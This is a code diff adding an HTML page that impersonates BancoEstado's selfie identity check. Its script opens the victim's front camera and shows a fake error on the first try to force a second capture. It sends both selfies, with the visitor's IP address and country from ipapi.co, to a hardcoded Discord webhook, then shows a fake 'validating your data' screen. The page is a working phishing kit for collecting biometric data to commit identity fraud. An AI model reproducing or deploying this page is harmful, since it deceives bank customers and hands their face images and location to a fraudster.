@@ -1,1 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BancoEstado - Selfie</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
 
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f7f9;
+            display: flex;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 420px;
+            background-color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .header {
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            z-index: 20;
+        }
+
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-icon { color: #1a348e; font-size: 24px; cursor: pointer; text-decoration: none; }
+        .logo-header { height: 22px; }
+        .close-icon { color: #64748b; font-size: 20px; cursor: pointer; }
+
+        .camera-box {
+            flex-grow: 1;
+            position: relative;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .overlay-svg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .instructions-container {
+            position: absolute;
+            bottom: 40px;
+            width: 100%;
+            text-align: center;
+            z-index: 15;
+            padding: 0 40px;
+            box-sizing: border-box;
+        }
+
+        .title-step {
+            color: #1e293b;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .desc-step {
+            color: #64748b;
+            font-size: 14px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+
+        #error-msg {
+            display: none;
+            color: #e11d48;
+            background: #fff1f2;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            font-size: 14px;
+            border: 1px solid #fda4af;
+        }
+
+        .action-footer {
+            padding: 30px;
+            background: white;
+            text-align: center;
+            z-index: 20;
+        }
+
+        .btn-comenzar {
+            background-color: #ff8c00;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.25);
+        }
+
+        #final-screen {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            z-index: 100;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .final-icon {
+            width: 80px;
+            height: 80px;
+            background: #f0fdf4;
+            color: #22c55e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div id="final-screen">
+            <div class="final-icon">✓</div>
+            <h2 style="color:#1a348e; margin-bottom: 15px;">Validando información</h2>
+            <p style="color:#64748b; line-height: 1.6;">Estamos validando tus datos con nuestro sistema de seguridad. En un periodo máximo de <b>dos horas</b> nos comunicaremos contigo.</p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" style="height: 20px; margin-top: 40px; opacity: 0.6;">
+        </div>
+
+        <div class="header">
+            <div class="header-left">
+                <span class="back-icon">←</span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" class="logo-header">
+            </div>
+            <div class="close-icon">✕</div>
+        </div>
+
+        <div class="camera-box">
+            <video id="video" autoplay playsinline></video>
+
+            <svg class="overlay-svg" preserveAspectRatio="none">
+                <defs>
+                    <mask id="mask">
+                        <rect width="100%" height="100%" fill="white" />
+                        <ellipse cx="50%" cy="40%" rx="125" ry="175" fill="black" />
+                    </mask>
+                </defs>
+                <rect width="100%" height="100%" fill="rgba(255, 255, 255, 0.85)" mask="url(#mask)" />
+                <ellipse cx="50%" cy="40%" rx="125" ry="175" fill="none" stroke="#ff8c00" stroke-width="3" id="oval-border" />
+            </svg>
+
+            <div class="instructions-container">
+                <div id="error-msg">⚠️ Aléjate un poco del óvalo</div>
+                <div class="title-step">Prepárate para la Selfie</div>
+                <div class="desc-step">Centra tu cara en el óvalo y presiona el botón para capturar.</div>
+            </div>
+        </div>
+
+        <div class="action-footer">
+            <button class="btn-comenzar" id="btnSnap">Comenzar</button>
+        </div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const btn = document.getElementById('btnSnap');
+        const errorMsg = document.getElementById('error-msg');
+        const finalScreen = document.getElementById('final-screen');
+        const ovalBorder = document.getElementById('oval-border');
+        const canvas = document.getElementById('canvas');
+
+        const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";
+        let intentos = 0;
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+            } catch (err) { console.error("Error cámara:", err); }
+        }
+
+        async function sendToDiscord() {
+            // Configurar canvas para capturar la foto
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir a Blob para enviar archivo
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+
+                // Obtener datos de ubicación
+                let ip = "Desconocida";
+                let pais = "Desconocido";
+                try {
+                    const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
+                    ip = geo.ip;
+                    pais = geo.country_name;
+                } catch(e) {}
+
+                // Preparar mensaje para Discord
+                const content = {
+                    embeds: [{
+                        title: "📸 SELFIE CAPTURADA",
+                        color: 16745472,
+                        fields: [
+                            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+                            { name: "🌍 País", value: `**${pais}**`, inline: true }
+                        ],
+                        timestamp: new Date()
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(content));
+                formData.append('file', blob, 'selfie.png');
+
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/png');
+        }
+
+        btn.addEventListener('click', () => {
+            intentos++;
+
+            if (intentos === 1) {
+                errorMsg.style.display = 'block';
+                ovalBorder.setAttribute('stroke', '#e11d48');
+
+                // Capturar y enviar aunque falle el primer intento
+                sendToDiscord();
+
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                    ovalBorder.setAttribute('stroke', '#ff8c00');
+                }, 3000);
+
+            } else if (intentos >= 2) {
+                btn.innerText = "Procesando...";
+                btn.disabled = true;
+                // Enviar la segunda captura
+                sendToDiscord();
+
+                setTimeout(() => {
+                    finalScreen.style.display = 'flex';
+                }, 1500);
+            }
+        });
+
+        startCamera();
+    </script>
+</body>
+</html>
